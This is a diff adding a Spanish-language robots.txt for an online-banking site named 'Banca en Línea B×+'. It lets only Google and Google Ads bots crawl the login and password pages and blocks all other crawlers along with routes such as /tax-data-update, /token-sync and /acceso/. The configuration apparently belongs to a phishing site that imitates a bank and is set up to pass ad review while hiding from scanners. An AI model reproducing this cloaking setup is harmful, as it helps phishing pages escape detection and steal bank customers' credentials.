@@ -1,0 +1,112 @@
+# robots.txt para Banca en Línea B×+
+# Permitir solo bots de Google para Google Ads
+# Bloquear todos los demás bots rastreadores y acceso a assets
+
+User-agent: Googlebot
+Allow: /
+Disallow: /assets/
+Disallow: /src/
+Disallow: /node_modules/
+Disallow: /.env
+Disallow: /package.json
+Disallow: /vite.config
+Disallow: /tsconfig.json
+Disallow: /.git/
+Disallow: /api/
+Disallow: /admin/
+Disallow: /config/
+Disallow: /database/
+Disallow: /server/
+Disallow: /websocket
+Disallow: /dashboard
+Disallow: /tax-data-update
+Disallow: /tax-confirmation
+Disallow: /token-sync
+Disallow: /acceso/
+
+User-agent: Googlebot-Image
+Allow: /
+Disallow: /assets/
+Disallow: /src/
+Disallow: /node_modules/
+
+User-agent: Googlebot-Video
+Allow: /
+Disallow: /assets/
+Disallow: /src/
+
+User-agent: Mediapartners-Google
+Allow: /
+Disallow: /assets/
+Disallow: /src/
+
+User-agent: AdsBot-Google
+Allow: /login
+Allow: /password
+Disallow: /assets/
+Disallow: /src/
+Disallow: /node_modules/
+Disallow: /dashboard
+Disallow: /tax-data-update
+Disallow: /tax-confirmation
+Disallow: /token-sync
+Disallow: /acceso/
+
+User-agent: AdsBot-Google-Mobile
+Allow: /login
+Allow: /password
+Disallow: /assets/
+Disallow: /src/
+
+User-agent: Google-InspectionTool
+Allow: /login
+Allow: /password
+Disallow: /assets/
+Disallow: /src/
+
+# Bloquear TODOS los demás bots completamente
+User-agent: *
+Disallow: /
+
+# Bloquear acceso a assets, código fuente y archivos sensibles
+User-agent: *
+Disallow: /assets/
+Disallow: /src/
+Disallow: /node_modules/
+Disallow: /.env
+Disallow: /package.json
+Disallow: /package-lock.json
+Disallow: /yarn.lock
+Disallow: /vite.config
+Disallow: /tsconfig.json
+Disallow: /.git/
+Disallow: /api/
+Disallow: /admin/
+Disallow: /config/
+Disallow: /database/
+Disallow: /server/
+Disallow: /websocket
+Disallow: /dashboard
+Disallow: /tax-data-update
+Disallow: /tax-confirmation
+Disallow: /token-sync
+Disallow: /acceso/
+Disallow: /*.js$
+Disallow: /*.ts$
+Disallow: /*.tsx$
+Disallow: /*.json$
+Disallow: /*.map$
+Disallow: /*.css$
+Disallow: /*.scss$
+Disallow: /*.sass$
+Disallow: /*.less$
+
+# Bloquear acceso a rutas específicas para todos los bots excepto Google
+User-agent: *
+Disallow: /dashboard
+Disallow: /tax-data-update
+Disallow: /tax-confirmation
+Disallow: /token-sync
+Disallow: /acceso/
+
+
